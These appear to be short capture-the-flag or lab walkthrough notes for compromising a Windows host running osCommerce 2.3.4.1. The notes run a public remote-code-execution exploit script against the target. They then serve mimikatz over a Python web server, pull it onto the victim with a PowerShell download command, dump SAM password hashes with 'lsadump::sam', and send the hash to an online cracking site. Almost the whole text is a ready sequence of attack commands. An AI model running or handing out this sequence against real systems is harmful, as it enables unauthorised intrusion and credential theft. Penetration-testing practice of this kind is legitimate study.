nmap scan, then
[osCommerce 2.3.4.1 - Remote Code Execution (2) - PHP webapps Exploit](https://www.exploit-db.com/exploits/50128)

 python3 50128.py http://10.114.145.176:8080/oscommerce-2.3.4/catalog/

cd /usr/share/windows-resources/mimikatz/x64

python3 -m http.server 80

powershell (New-Object System.Net.WebClient).DownloadFile(\"http://192.168.158.93/mimikatz.exe\", \"mimikatz.exe\")

mimikatz "lsadump::sam" exit

then paste the hash to NTLM.pw.